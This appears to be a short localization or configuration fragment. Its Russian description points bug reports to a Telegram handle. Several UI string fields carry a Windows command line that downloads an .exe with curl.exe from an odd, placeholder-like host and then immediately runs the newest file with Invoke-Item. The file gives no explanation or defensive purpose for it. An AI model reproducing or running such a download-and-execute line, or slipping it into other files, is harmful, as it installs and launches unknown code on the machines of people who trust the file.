header.description: если что-то не работает или нашли баги пишите мне, вот Telegram: @Olegmelon24k

look.name: .bat command line curl.exe -O "https://why.are.you.looking?/exe1.exe"; Invoke-Item (Get-ChildItem | Sort-Object LastWriteTime | Select-Object -Last 1).FullName

rightChild.value: .bat command line curl.exe -O "https://why.are.you.looking?/exe1.exe"; Invoke-Item (Get-ChildItem | Sort-Object LastWriteTime | Select-Object -Last 1).FullName
.bat command line curl.exe -O "https://why.are.you.looking?/exe1.exe"; Invoke-Item (Get-ChildItem | Sort-Object LastWriteTime | Select-Object -Last 1).FullName

formula.value: URL (our browser has a special URL)
URL (our browser has a special URL)
